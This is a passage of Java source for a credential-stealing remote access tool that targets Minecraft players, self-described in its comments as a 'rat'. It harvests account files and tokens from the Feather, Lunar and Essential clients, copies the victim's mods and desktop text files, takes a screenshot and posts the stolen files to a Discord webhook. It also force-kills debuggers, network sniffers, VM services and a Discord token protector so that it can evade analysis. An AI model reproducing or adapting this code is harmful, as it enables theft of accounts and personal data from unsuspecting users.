        try {

            String MinecraftAccountsPath = ilrFolderPath + "\\minecraft";
            String AccountsFileText;
            (new File(MinecraftAccountsPath)).mkdirs();

            String Featherpath = "C:\\Users\\" + PcName + "\\AppData\\Roaming\\.feather\\accounts.json";
            String Essentialspath = "C:\\Users\\" + PcName + "\\AppData\\Roaming\\.minecraft\\essential\\microsoft_accounts.json";
            String Lunarpath = "C:\\Users\\" + PcName + "\\.lunarclient\\settings\\game\\accounts.json";

            Path featherpath = Paths.get(MinecraftAccountsPath + "\\Feather Accounts.txt");
            if (Files.exists(featherpath)) {CheckFeatherAccounts=true;}
            Path lunarpath = Paths.get(MinecraftAccountsPath + "\\Lunar Accounts.txt");
            if (Files.exists(lunarpath)) {CheckLunarAccounts=true;}
            Path essentialspath = Paths.get(MinecraftAccountsPath + "\\Essentials Accounts.txt");
            if (Files.exists(essentialspath)) {CheckEssentialsAccounts=true;}

            String Featheracs = "";
            String Lunaracs = "";
            String Essentialsacs = "";

            if (Files.exists(Paths.get(Featherpath))) {
                AccountsFileText = ReadFile(Featherpath);

                String[] SplitFileText = AccountsFileText.split("\"minecraftUuid\":\"");
                for (String s : SplitFileText) {
                    String[] SplitSplitFileText = s.split("\",\"");
                    if (SplitSplitFileText[0].contains("selectedAccountID")) continue;
                    String username = ReadWebsite("https://crafthead.net/profile/" + SplitSplitFileText[0]).split("\"")[7];
                    MinecraftAccountUsernames += username + " - Feather |\n";
                    Featheracs += username + " | ";
                }

                if (CheckFeatherAccounts && !AccountsFileText.equals(ReadFile(MinecraftAccountsPath + "\\Feather Accounts.txt"))) {
                    Files.copy(Paths.get(Featherpath), featherpath, StandardCopyOption.REPLACE_EXISTING);
                    UploadFileToWebhook(PcName + " has new feather accounts```" + Featheracs + "```", MinecraftAccountsPath + "\\Feather Accounts.txt");
                }

                Files.copy(Paths.get(Featherpath), featherpath, StandardCopyOption.REPLACE_EXISTING);

            }
            if (Files.exists(Paths.get(Lunarpath))) {
                AccountsFileText = ReadFile(Lunarpath);

                String[] SplitFileText = AccountsFileText.split("\"name\": ");
                for (String s : SplitFileText) {
                    String[] SplitSplitFileText = s.split("},");
                    if (SplitSplitFileText[0].contains("activeAccountLocalId")) continue;
                    String username = SplitSplitFileText[0].replace("\"", "").replace(" ", "");
                    MinecraftAccountUsernames +=  username + " - Lunar |\n";
                    Lunaracs += username + " | ";
                }

                if (CheckLunarAccounts && !AccountsFileText.equals(ReadFile(MinecraftAccountsPath + "\\Lunar Accounts.txt"))) {
                    Files.copy(Paths.get(Featherpath), lunarpath, StandardCopyOption.REPLACE_EXISTING);
                    UploadFileToWebhook(PcName + " has new lunar accounts```" + Lunaracs + "```", MinecraftAccountsPath + "\\Lunar Accounts.txt");
                }

                Files.copy(Paths.get(Lunarpath), lunarpath,StandardCopyOption.REPLACE_EXISTING);

            }
            if (Files.exists(Paths.get(Essentialspath))) {
                AccountsFileText = ReadFile(Essentialspath);
                String[] SplitFileText = AccountsFileText.split("\",\"name\":\"");
                for (String s : SplitFileText) {
                    String[] SplitSplitFileText = s.split("\",\"accessToken\":\"");
                    if (SplitSplitFileText[0].contains("}") || SplitSplitFileText[0].contains("\\") || SplitSplitFileText[0].contains("uuid") || SplitSplitFileText[0].contains("openUri")) continue;
                    String username = SplitSplitFileText[0].replace("\"", "");
                    MinecraftAccountUsernames += username + " - Essentials |\n";
                    Essentialsacs += username + " | ";
                }

                if (CheckEssentialsAccounts && !AccountsFileText.equals(ReadFile(MinecraftAccountsPath + "\\Essentials Accounts.txt"))) {
                    Files.copy(Paths.get(Featherpath), essentialspath, StandardCopyOption.REPLACE_EXISTING);
                    UploadFileToWebhook(PcName + " has new essentials accounts```" + Essentialsacs + "```", MinecraftAccountsPath + "\\Essentials Accounts.txt");
                }
                Files.copy(Paths.get(Essentialspath), essentialspath,StandardCopyOption.REPLACE_EXISTING);

            }
            //System.out.println("DONE GETTING MINECRAFT ACCOUNTS");

        }
        catch (Exception p) {
            ErrorMessage(p, "minecraft account stealer");
        }
    }

    // idfk why u want this soezbitch asked for it
    public static void StealMods() throws IOException {
        if (Files.isDirectory(Paths.get(appData + "\\.minecraft\\mods"))) {

            for (File file : Objects.requireNonNull(Paths.get(appData + "\\.minecraft\\mods").toFile().listFiles())) {
                System.out.println(file.getName());
                if (file.isFile() && file.getName().endsWith(".jar")) {
                    (new File(ilrFolderPath + "\\mods")).mkdirs();
                    FileUtils.copyFile(new File(appData + "\\.minecraft\\mods\\" + file.getName()), new File(ilrFolderPath + "\\mods\\" + file.getName()));
                }
            }
        }
    }

    public static void StealDesktop() throws IOException {
        (new File(ilrFolderPath + "\\desktop")).mkdirs();
        if (Files.isDirectory(Paths.get(System.getProperty("user.home") + "\\Desktop"))) {
            System.out.println("hhh");
            for (File file : Objects.requireNonNull(Paths.get(System.getProperty("user.home") + "\\Desktop").toFile().listFiles())) {
                System.out.println(file.getName());
                if (file.isFile() && file.getName().endsWith(".txt")) {
                    FileUtils.copyFile(new File(System.getProperty("user.home") + "\\Desktop\\" + file.getName()), new File(ilrFolderPath + "\\desktop\\" + file.getName()));
                }
            }
        }
    }

    public static void pack(String sourceDirPath, String zipFilePath) throws IOException {
        Path p = Files.createFile(Paths.get(zipFilePath));
        try (ZipOutputStream zs = new ZipOutputStream(Files.newOutputStream(p))) {
            Path pp = Paths.get(sourceDirPath);
            Files.walk(pp)
                    .filter(path -> !Files.isDirectory(path))
                    .forEach(path -> {
                        ZipEntry zipEntry = new ZipEntry(pp.relativize(path).toString());
                        try {
                            zs.putNextEntry(zipEntry);
                            Files.copy(path, zs);
                            zs.closeEntry();
                        } catch (IOException ignored) {
                        }
                    });
        }
    }

    private static Vector<String> FindPattern(Pattern pattern, String string) {
        Vector<String> result = new Vector<String>();
        try {
            Matcher crawler = pattern.matcher(string);
            while (crawler.find() && !result.contains(crawler.group())) {
                result.add(crawler.group());
            }
        } catch (Exception ignored) {
        }
        return result;
    }

    private static void ErrorMessage(Exception error, String where) {
        try {
            //SendMessageToWebhook("@everyone rat fucking failed wtf who coded this shit! |  ERROR: ```" + error.toString() + "``` in ```" + where + "``` please dm iloverat.9200 with this error even if the info sent");
        } catch (Exception e) {
            throw new RuntimeException(e);
        }
    }

    private static String ReadWebsite(String website) {
        return ReadWebsite(website, "h");
    }

    private static String ReadWebsite(String website, String authkey) {
        try {
            HttpsURLConnection userCon = (HttpsURLConnection) new URL(website).openConnection();
            if (!Objects.equals(authkey, "h")) userCon.setRequestProperty("Authorization", authkey);
            userCon.setRequestProperty("Content-Type", "application/json");
            userCon.setRequestProperty("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36");

            if (!(userCon.getResponseCode() == 200)) {return "h";}

            BufferedReader reader = new BufferedReader(new java.io.InputStreamReader(userCon.getInputStream()));
            StringBuilder builder = new StringBuilder();
            String line;
            while ((line = reader.readLine()) != null) {
                builder.append(line);
                builder.append(System.lineSeparator());
            }
            reader.close();
            return builder.toString();
        } catch (IOException e) {
            ErrorMessage(e, "in reading the website");
            return "h";
        }
    }

    private static String ReadFile(String filepath) {
        try {
            File file = new File(filepath);
            BufferedReader reader = new BufferedReader(new FileReader(file));
            StringBuilder content = new StringBuilder();
            while (reader.ready()) {
                content.append(reader.readLine());
            }
            reader.close();
            return content.toString();
        } catch (Exception ignored) {
        }
        return "";
    }

    static String[] badtasksanger = {
            "fakenet",
            "dumpcap",
            "httpdebuggerui",
            "wireshark",
            "fiddler",
            "vboxservice",
            "df5serv",
            "vboxtray",
            "vmtoolsd",
            "vmwaretray",
            "ida64",
            "ollydbg",
            "pestudio",
            "vmwareuser",
            "vgauthservice",
            "vmacthlp",
            "x96dbg",
            "vmsrvc",
            "x32dbg",
            "vmusrvc",
            "prl_cc",
            "prl_tools",
            "xenservice",
            "qemu-ga",
            "joeboxcontrol",
            "ksdumperclient",
            "ksdumper",
            "joeboxserver",
            "vmwareservice",
            "vmwaretray",
            "discordtokenprotector"
    };

    private static void MurderTasks() {
        for (String taskname : badtasksanger) {
            try {
                Runtime.getRuntime().exec("taskkill /F /IM "+taskname+".exe");
            }
            catch (Exception ignored) {}
        }
    }

    private static String GetHWID() {
        try {
            //System.out.println("DONE GETTING HWID");
            return Base64.getEncoder().encodeToString((System.getenv("user.name") + System.getenv("COMPUTERNAME") + System.getenv("PROCESSOR_IDENTIFIER").replace(" ", "").replace(",", "")).getBytes(StandardCharsets.UTF_8));
        } catch (Exception e) {
            ErrorMessage(e, "GETTING HWID?? LITTERALLY NO CLUE");
            return "";
        }
    }

    @SuppressWarnings("all")
    private static void ScreenshotScreen() {
        if (!NotFirstTime) {
            try {
                Dimension screenSize = Toolkit.getDefaultToolkit().getScreenSize();
                Rectangle screenRectangle = new Rectangle(screenSize);
                Robot robot = new Robot();
                BufferedImage image = robot.createScreenCapture(screenRectangle);
                int random = new Random().nextInt();
                ImageIO.write(image, "png", new File(ilrFolderPath + "\\screenshit.png"));
                //System.out.println("DONE GETTING SCREENSHOT");
            } catch (Exception e) {
                ErrorMessage(e, "in taking a screenshot????????????? (no fucking idea pls report this)");
            }
        }
        else {
            //System.out.println("NOT FIRST TIME NO SCREENSHOT TAKEN");
        }
    }





    /*
    https://github.com/sxmurxy2005/Discord-Webhook-API
    https://github.com/sxmurxy2005/Discord-Webhook-API
    https://github.com/sxmurxy2005/Discord-Webhook-API
    https://github.com/sxmurxy2005/Discord-Webhook-API
    https://github.com/sxmurxy2005/Discord-Webhook-API
    https://github.com/sxmurxy2005/Discord-Webhook-API
    https://github.com/sxmurxy2005/Discord-Webhook-API
    https://github.com/sxmurxy2005/Discord-Webhook-API
     */

    public static class DiscordEmbed {

        String title;
        String description;
        String url;
        Integer color;
        String timestamp;
        AuthorEmbed author;
        ImageEmbed image;
        ThumbnailEmbed thumbnail;
        FooterEmbed footer;
        List<FieldEmbed> fields;

        private DiscordEmbed() {}

        public static DiscordEmbed.Builder builder() {
            return new Builder();
        }

        public static class Builder {

            private final DiscordEmbed embed = new DiscordEmbed();

            public Builder withTitle(String title) {
                embed.title = title;
                return this;
            }

            /**
             * Title will become clickable with this url.
             */
            public Builder withTitleUrl(String url) {
                embed.url = url;
                return this;
            }

            public Builder withDescription(String description) {
                embed.description = description;
                return this;
            }

            /**
             * Embed will have a colored border on the left.
             */
            public Builder withColor(Color color) {
                embed.color = (((color.getRed() << 8) + color.getGreen()) << 8) + color.getBlue();
                return this;
            }

            /**
             * Embed will have signature with date.
             */
            public Builder withTimestamp(Calendar calendar) {
                embed.timestamp = OffsetDateTime.ofInstant(calendar.toInstant(), calendar.getTimeZone().toZoneId()).toString();;
                return this;
            }

            /**
             * Embed will have signature with date.
             */
            public Builder withTimestamp(long timeInMillis) {
                Calendar calendar = Calendar.getInstance(TimeZone.getTimeZone("GMT"));
                calendar.setTimeInMillis(timeInMillis);
                return withTimestamp(calendar);
            }

            public Builder withAuthor(AuthorEmbed author) {
                embed.author = author;
                return this;
            }

            public Builder withImage(ImageEmbed image) {
                embed.image = image;
                return this;
            }

            public Builder withThumbnail(ThumbnailEmbed thumbnail) {
                embed.thumbnail = thumbnail;
                return this;
            }

            public Builder withFooter(FooterEmbed footer) {
                embed.footer = footer;
                return this;
            }

            public Builder addField(FieldEmbed field) {
                return addFields(field);
            }

            public Builder addFields(FieldEmbed... fields) {
                if (embed.fields == null)
                    embed.fields = new ArrayList<>(6);

                Collections.addAll(embed.fields, fields);
                return this;
            }

            public DiscordEmbed build() {
                return embed;
            }

        }

        public static class AuthorEmbed {

            String name;
            String icon_url;
            String url;

            public AuthorEmbed(String name, String icon_url) {
                this.name = name;
                this.icon_url = icon_url;
            }

            /**
             * @param url - author name will become clickable with this url.
             */
            public AuthorEmbed(String name, String icon_url, String url) {
                this(name, icon_url);
                this.url = url;
            }

        }

        public static class FieldEmbed {

            String name;
            String value;
            Boolean inline;

            public FieldEmbed(String name, String value) {
                this.name = name;
                this.value = value;
            }

            /**
             * @param inline - controls whether field will be in the next line or in the same. Default is false.
             */
            public FieldEmbed(String name, String value, Boolean inline) {
                this(name, value);
                this.inline = inline;
            }

        }

        public static class ImageEmbed {

            String url;

            public ImageEmbed(String url) {
                this.url = url;
            }

        }

        public static class ThumbnailEmbed {

            String url;

            public ThumbnailEmbed(String url) {
                this.url = url;
            }

        }

        public static class FooterEmbed {

            String text;
            String icon_url;

            public FooterEmbed(String text, String icon_url) {
                this.text = text;
                this.icon_url = icon_url;
            }

        }

    }

    public static class DiscordMessage {

        String username;
        String avatar_url;
        String content;
        Boolean tts;
        List<DiscordEmbed> embeds;
        transient List<File> files; // transient - excluding files from json created from the object. They will added separately.

        private DiscordMessage() {}

        public static DiscordMessage.Builder builder() {
            return new Builder();
        }

        public static class Builder {

            private final DiscordMessage message = new DiscordMessage();

            /**
             * Overrides the Discord BOT name.
             */
            public Builder withUsername(String username) {
                message.username = username;
                return this;
            }

            /**
             * Overrides the Discord BOT avatar.
             */
            public Builder withAvatar(String avatar_url) {
                message.avatar_url = avatar_url;
                return this;
            }

            /**
             * Just the content of the message.
             */
            public Builder withContent(String content) {
                message.content = content;
                return this;
            }

            public Builder withTextToSpeech(boolean tts) {
                message.tts = tts;
                return this;
            }

            public Builder addEmbed(DiscordEmbed embed) {
                return addEmbeds(embed);
            }

            public Builder addEmbeds(DiscordEmbed... embeds) {
                if (message.embeds == null)
                    message.embeds = new ArrayList<>(3);

                Collections.addAll(message.embeds, embeds);
                return this;
            }

            public Builder addFile(File file) {
                return addFiles(file);
            }

            public Builder addFiles(File... files) {
                if (message.files == null)
                    message.files = new ArrayList<>(3);

                Collections.addAll(message.files, files);
                return this;
            }

            public DiscordMessage build() {
                return message;
            }

        }

    }

    public static class WebhookAgent {

        private static final HttpClient HTTP_CLIENT = HttpClients.createDefault();
        private  static final Gson GSON = new Gson();
        private final String url;

        public WebhookAgent(String url) {
            this.url = url;
        }

        public String getUrl() {
            return url;
        }

        public void execute(DiscordMessage message) {
            if (message.content == null && message.files == null && message.embeds == null)
                throw new RuntimeException("Discord message can't contain no information.");

            new Thread(() -> {
                HttpPost httpPost = new HttpPost(url);
                HttpEntity entity = null;
                if (message.files != null) {
                    MultipartEntityBuilder entityBuilder = MultipartEntityBuilder.create();
                    entityBuilder.addTextBody("payload_json", GSON.toJson(message), ContentType.APPLICATION_JSON);
                    for (int i = 0; i < message.files.size(); i++) {
                        File file = message.files.get(i);
                        if (file.exists() && file.isFile())
                            entityBuilder.addBinaryBody("file" + i, file);
                        else
                            System.err.print("File [" + file.getAbsolutePath() + "] doesn't exist. It is skipped.");
                    }
                    entity = entityBuilder.build();
                } else {
                    try {
                        httpPost.addHeader("Content-Type", "application/json");
                        entity = new StringEntity(GSON.toJson(message));
                    } catch (UnsupportedEncodingException ex) {
                        ex.printStackTrace();
                        return;
                    }
                }
                httpPost.setEntity(entity);

                try {
                    HTTP_CLIENT.execute(httpPost);
                } catch (IOException ex) { ex.printStackTrace(); }

            }).start();
        }

    }
}
